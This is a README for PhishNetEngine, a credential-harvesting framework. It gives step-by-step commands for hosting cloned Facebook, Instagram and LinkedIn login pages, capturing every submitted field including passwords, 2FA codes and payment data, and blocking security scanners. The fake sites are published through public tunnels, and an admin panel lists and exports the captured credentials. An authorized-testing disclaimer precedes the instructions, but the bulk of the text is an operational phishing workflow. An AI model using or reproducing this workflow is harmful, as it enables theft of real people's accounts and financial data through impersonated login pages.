# PhishNet Engine
A powerful, modular credential harvesting framework for authorized security testing.

**PhishNetEngine** is like a game engine, but for creating phishing tools. Just as a game engine provides the physics, rendering, and mechanics to build games, PhishNetEngine provides the server, tunneling, data capture, and admin panel to build credential harvesting tools.

## Legal Disclaimer

This tool is intended **strictly for authorized security testing, research, and educational purposes only.**

By using this software, you agree that:

- You will **only use this tool on systems you own or have explicit written permission to test**.
- You will **not use this tool for illegal phishing, credential harvesting, or any malicious activities**.
- Any misuse of this software is **the sole responsibility of the user**.
- The developer **assumes no liability and are not responsible for any misuse, damage, or legal consequences caused by this tool**.
- Users must **comply with all applicable local, state, national, and international laws**.

Unauthorized use of this tool may violate cybersecurity, privacy, and computer misuse laws.  
The author of this project **are not responsible for any illegal use or misuse of this software**.

## Features
- **Host Any Website** - Drop your HTML/CSS/JS files and they're live instantly
- **Captures ALL Form Data** - Every field, any name, all values saved (email, password, 2FA, payment, custom fields)
- **Secure Admin Panel** - Random credentials, session management, brute force protection
- **Multiple Projects** - Create and switch between different phishing sites
- **Tunnel Support** - Cloudflared and Serveo.net for instant public HTTPS URLs
- **Real-time Dashboard** - View captures with filtering, search, and export options
- **Custom Field Detection** - Shows both common and custom form fields in purple
- **Linux Optimized** - Works on Debian/Ubuntu, Arch, RHEL/CentOS, Fedora
- **Bot Filtering** - Blocks scanners and crawlers automatically
- **Rate Limiting** - 30 requests per minute per IP
- **Export Options** - JSON (all data) and CSV (dynamic columns)

## Requirements
- **OS**: Linux (Ubuntu/Debian, Arch, RHEL/CentOS, Fedora)
- **Node.js**: 14.x or higher
- **Dependencies**: curl, ssh (auto-installed if missing)

## Installation
```bash
# Clone the repository
git clone https://github.com/s-r-e-e-r-a-j/PhishNetEngine.git

# Go to the PhishNetEngine directory 
cd PhishNetEngine

# Go to the phishnet-engine directory
cd phishnet-engine

# Install dependencies
npm install

```

## Quick Start

```bash
# Run the engine
node phishnetengine

# Follow the interactive menu:
# 1. Choose "Create new project"
# 2. Enter project name (e.g., facebook-login)
# 3. Enter site name (e.g., facebook)  
# 4. Enter endpoints (e.g., /login,/auth,/2fa)

# stop it press ctrl+c

#  NOW add your cloned website files
cp -r /path/to/your/cloned/site/* sites/facebook-login/

# Run the engine again
node phishnetengine

# 5. Choose "Load existing project"
# 6. Select your project (e.g., "facebook-login")
# 7. Select tunnel method (Cloudflared or Serveo)

# Access your site via the public URL shown
# Access admin panel at: http://localhost:3000/admin-RANDOMTOKEN

# Admin panel username, password, and link also shown in terminal

```

## Project Structure 

```text
phishnet-engine/
├── phishnetengine.js   # Main entry point
├── config/   # Configuration files
├── utils/    # Utility functions
├── handlers/  # Tunnel handlers (cloudflared, serveo)
├── panels/  # Admin panel
├── engine/  # Core engine
├── sites/   # YOUR WEBSITE PROJECTS GO HERE
│   └── your-project/  # Each project folder
│       ├── config.json   # Project settings (MANDATORY)
│       ├── index.html   # Your website files
│       ├── css/  # CSS files
│       ├── js/  # JavaScript files
│       └── img/   # Images
├── data/    # Captured data (captures.dat)
└── .server/  # Tunnel binaries (cloudflared)

```


## Understanding config.json

`config.json` is **MANDATORY** for every project. Without it, the engine ignores your folder.

### Example config.json:

```json
{
  "name": "facebook-login",
  "site": "facebook",
  "endpoints": ["/login", "/auth", "/2fa"],
  "port": 3000,
  "created": 1678901234567
}
```

| Field | Description | Example |
|-------|-------------|---------|
| `name` | Must match folder name | `"facebook-login"` |
| `site` | Site identifier for logs | `"facebook"` |
| `endpoints` | POST routes to capture | `["/login", "/auth"]` |
| `port` | Server port | `3000` |
| `created` | Unix timestamp | `1678901234567` |

## Two Ways to Use the Engine
### Method 1: Create New Project (Recommended)

```bash
# 1. Run the engine
node phishnetengine 

# 2. Choose "Create new project"
? Project setup: Create new project
? Project name: facebook-login
? Site name: facebook
? Endpoints: /login,/auth,/2fa

# 3. stop it press ctrl+c

# 4. Engine CREATES everything automatically:
#    - sites/facebook-login/ folder
#    - sites/facebook-login/config.json
#    - sites/facebook-login/css/ (empty)
#    - sites/facebook-login/js/ (empty)
#    - sites/facebook-login/img/ (empty)

# 5. YOU paste your cloned site files:
cp -r ~/Downloads/facebook-clone/* sites/facebook-login/

# 6. Run again and load your project
node phishnetengine
# Choose "Load existing project" → select "facebook-login"

```

### Method 2: Load Existing Project (Manual Setup)

```bash
# 1. YOU create the project folder first
mkdir -p sites/instagram-campaign

# 2. YOU paste your cloned site files
cp -r ~/Downloads/instagram-clone/* sites/instagram-campaign/

# 3. YOU MUST create config.json manually
#    Create file: sites/instagram-campaign/config.json

{
  "name": "instagram-campaign",
  "site": "instagram",
  "endpoints": ["/login", "/auth", "/two-factor"],
  "port": 3000,
  "created": 1678901234567
}

# 4. Run engine and load project
node phishnetengine
# Choose "Load existing project"
# Select "instagram-campaign"
```

### Complete Manual Setup Example

```bash
# 1. Create folder
mkdir -p sites/linkedin-phish

# 2. Paste cloned LinkedIn files
cp -r ~/Downloads/linkedin-clone/* sites/linkedin-phish/

# 3. Create config.json
cat > sites/linkedin-phish/config.json << 'EOF'
{
  "name": "linkedin-phish",
  "site": "linkedin",
  "endpoints": ["/login", "/auth", "/checkpoint"],
  "port": 3000,
  "created": 1678901234567
}
EOF

# 4. Verify structure
ls -la sites/linkedin-phish/
# Should show:
#   config.json
#   index.html
#   css/
#   js/
#   img/

# 5. Run engine and load project
node phishnetengine
# Choose "Load existing project"
# Select "linkedin-phish"

```

## Adding Website Files

Place your HTML, CSS, JS, and images in the project folder:

```bash
sites/instagram-login/
├── index.html
├── css/
│   └── style.css
├── js/
│   └── script.js
└── img/
    └── logo.png
```

## Form Data Capture
The engine captures ALL form fields - any name, any type:
```html
<!-- ALL these fields are captured -->
<form method="POST" action="/login">
    <input name="email">                    ✓ Captured
    <input name="password">                 ✓ Captured
    <input name="custom_field">             ✓ Captured
    <input name="random_name_123">          ✓ Captured
    <input name="user[data][value]">        ✓ Captured
    <input name="hidden_token">             ✓ Captured
    <input name="2fa_code">                  ✓ Captured
</form>
```

## Admin Panel
Access your admin panel at the URL shown when starting:

```text
http://localhost:3000/admin-RANDOMTOKEN
```

**security features:**
- Random password every run
- Random admin URL path (16 chars hex)
- Sessions expire after 1 hour
- IP binding prevents session theft
- 5 failed login attempts lockout
- Bot/user-agent filtering

**Dashboard Features:**
- Real-time updates (3 second polling)
- View all captured data
- Filter by site, IP, or type
- Search in captured data
- Export as JSON (all fields)
- Export as CSV (dynamic columns)
- Clear all logs

## Tunnel Options
**Cloudflared**
- Provides HTTPS URL: `https://random.trycloudflare.com`
- Auto-installs if missing
- More reliable for most users

**Serveo.net**

- Provides HTTPS URL: `https://random.serveousercontent.com`
- Uses SSH tunneling
- Good alternative if cloudflared fails

## Export Options
**JSON Export**
- Includes ALL data including raw fields and metadata. Perfect for analysis.

**CSV Export**
- Dynamic columns for ALL fields found in captures. Opens in Excel/LibreOffice.

## License 
This project is licensed under the MIT License.
